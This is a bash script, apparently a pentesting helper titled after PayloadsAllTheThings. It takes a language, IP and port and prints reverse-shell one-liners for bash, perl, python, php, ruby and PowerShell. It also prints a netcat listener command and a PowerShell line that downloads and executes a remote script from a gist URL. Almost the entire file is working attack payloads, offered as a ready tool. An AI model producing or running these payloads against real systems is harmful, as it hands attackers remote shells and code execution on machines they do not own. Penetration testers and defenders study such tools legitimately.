#!/usr/bin/bash
#version="Version 1.0"

language=$1
ip=$2
port=$3

#help function
if [[ $language == "-h" ]] || [[ $language == "--help" ]]
then
        echo -e "###################################################################"
        echo -e "          PayloadsAllTheThings - Rev Shell Cheat Sheet             "
        echo -e "###################################################################"
        echo -e "@rubb3rsc4nm4n"
        echo -e "$version"
        echo -e "Example: ./revshell.sh <lanugage> <local ip> <local port>"
                echo "languages:"
                echo "-a - output in all languages"
                echo "all - output in all languates"
                echo "bash_tcp"
                echo "bash_udp"
                echo "perl"
                echo "python"
                echo "php"
                echo "ruby"
        echo -e "##################################################################"
fi

#bash_tcp
if [[ $language == "bash_tcp" ]]
then
        echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
        echo "-------------------------------------------------------------"
        echo "bash 0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
fi

#bash_udp
if [[ $language == "bash_udp" ]]
then
        echo "sh -i >& /dev/udp/"$ip"/"$port" 0>&1"
        echo "-------------------------------------------------------------"
        echo "listener: nc -nlvp "$port
fi

#perl
if [[ $language == "perl" ]]
then
        string="perl -e '""use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""\"tcp\"""));if(connect(S,sockaddr_in("$port",inet_aton(""\"$ip\""")))){open(STDIN,""\">&S\""");open(STDOUT,""\">&S\""");open(STDERR,""\">&S\""");exec(""\"/bin/sh -i\""");};'"
        string2="perl -MIO -e '""\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,""\"$ip:$port\""");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
        echo $string
        echo "-------------------------------------------------------------"
        echo $string2

fi

#python
if [[ $language == "python" ]]
then
        python1="python -c '""import sys,socket,os,pty;s=socket.socket();s.connect((""\"$ip\""",$port),;[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""\"/bin/sh\""")'"
        python2="python -c '""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""\"$ip\""",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""\"/bin/bash\""")'"
        echo $python1
        echo "-------------------------------------------------------------"
        echo $python2
fi

#php
if [[ $language == "php" ]]
then
        php1="php -r '""\$sock=fsockopen(""\"$ip\""",$port);exec(""\"/bin/sh -i <&3 >&3 2>&3\""");'"
        php2="php -r '""\$sock=fsockopen(""\"$ip\""",$port);\$proc=proc_open(""\"/bin/sh -i\""", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
        echo $php1
        echo "--------------------------------------------------------------"
        echo $php2
fi

#ruby
if [[ $language == "ruby" ]]
then
        ruby1="ruby -rsocket -e'""f=TCPSocket.open(""\"$ip\""",$port).to_i;exec sprintf(""\"/bin/sh -i <&%d >&%d 2>&%d\""",f,f,f)'"
        ruby2="ruby -rsocket -e '""exit if fork;c=TCPSocket.new(""\"$ip\""",""\"$port\""");while(cmd=c.gets);IO.popen(cmd,""\"r\"""){|io|c.print io.read}end'"
        echo $ruby1
        echo "--------------------------------------------------------------"
        echo $ruby2
fi

#powershell
if [[ $language == "powershell" ]]
then
	powershell1="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
	powershell2="powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
	powershell3="powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"
	echo $powershell1
	echo "-------------------------------------------------------------"
	echo $powershell2
	echo "-------------------------------------------------------------"
	echo $powershell3
fi

## output all languages
if [[ $language == "all" ]] || [[ $language == "-a" ]]
then
        echo "bash_tcp"
        echo "-------------------------------------------------------------"
        echo "-------------------------------------------------------------"
        echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
        echo "-------------------------------------------------------------"
        echo "bash 0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
        echo " "
        echo "bash_udp"
        echo "-------------------------------------------------------------"
        echo "-------------------------------------------------------------"
        echo "sh -i >& /dev/udp/"$ip"/"$port" 0>&1"
        echo "-------------------------------------------------------------"
        echo "listener: nc -nlvp "$port
        echo "-------------------------------------------------------------"
        echo " "
        echo "perl"
        echo "-------------------------------------------------------------"
        echo "-------------------------------------------------------------"
        perl1="perl -e '""use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""\"tcp\"""));if(connect(S,sockaddr_in("$port",inet_aton(""\"$ip\""")))){open(STDIN,""\">&S\""");open(STDOUT,""\">&S\""");open(STDERR,""\">&S\""");exec(""\"/bin/sh -i\""");};'"
        perl2="perl -MIO -e '""\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,""\"$ip:$port\""");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
        echo $perl1
        echo "-------------------------------------------------------------"
        echo $perl2
        echo " "
        echo "python"
        echo "-------------------------------------------------------------"
        echo "-------------------------------------------------------------"
        pythonall1="python -c '""import sys,socket,os,pty;s=socket.socket();s.connect((""\"$ip\""",$port),;[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""\"/bin/sh\""")'"
        pythonall2="python -c '""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""\"$ip\""",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""\"/bin/bash\""")'"
        echo $pythonall1
        echo "-------------------------------------------------------------"
        echo $pythonall2
        echo " "
        echo "php"
        echo "-------------------------------------------------------------"
        echo "-------------------------------------------------------------"
        phpall1="php -r '""\$sock=fsockopen(""\"$ip\""",$port);exec(""\"/bin/sh -i <&3 >&3 2>&3\""");'"
        phpall2="php -r '""\$sock=fsockopen(""\"$ip\""",$port);\$proc=proc_open(""\"/bin/sh -i\""", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
        echo $phpall1
        echo "-------------------------------------------------------------"
        echo $phpall2
        echo " "
        echo "powershell"
	echo "-------------------------------------------------------------"
	echo "-------------------------------------------------------------"
	powershell1="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
	powershell2="powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
	powershell3="powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"
	echo $powershell1
	echo "-------------------------------------------------------------"
	echo $powershell2
	echo "-------------------------------------------------------------"
	echo $powershell3
	echo " " 
	echo "ruby"
        echo "-------------------------------------------------------------"
        echo "-------------------------------------------------------------"
        rubyall1="ruby -rsocket -e'""f=TCPSocket.open(""\"$ip\""",$port).to_i;exec sprintf(""\"/bin/sh -i <&%d >&%d 2>&%d\""",f,f,f)'"
        rubyall2="ruby -rsocket -e '""exit if fork;c=TCPSocket.new(""\"$ip\""",""\"$port\""");while(cmd=c.gets);IO.popen(cmd,""\"r\"""){|io|c.print io.read}end'"
        echo $rubyall1
        echo "-------------------------------------------------------------"
        echo $rubyall2
fi
